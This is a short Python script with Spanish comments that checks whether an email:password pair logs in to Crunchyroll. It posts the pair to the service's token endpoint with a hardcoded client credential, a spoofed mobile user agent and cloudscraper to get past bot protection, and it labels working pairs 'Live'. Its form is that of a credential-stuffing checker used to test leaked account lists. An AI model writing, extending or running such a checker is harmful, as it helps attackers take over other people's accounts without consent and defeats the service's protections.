import cloudscraper
import uuid

def check_crunchy_account(email, password):
    """
    Verifica si una cuenta de Crunchyroll (email:pass) es válida.
    Retorna (True, "Live") o (False, "Reason").
    """
    try:
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'android',
                'mobile': True
            }
        )
        
        url = "https://www.crunchyroll.com/auth/v1/token"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6", # Credencial estándar de Crunchyroll
        }
        
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "device_id": str(uuid.uuid4()),
            "device_type": "Chrome on Android"
        }
        
        response = scraper.post(url, headers=headers, data=data, timeout=20)
        
        if response.status_code == 200:
            return True, "Live"
        elif response.status_code == 401:
            return False, "Invalid Credentials"
        else:
            return False, f"Error {response.status_code}"
            
    except Exception as e:
        return False, str(e)
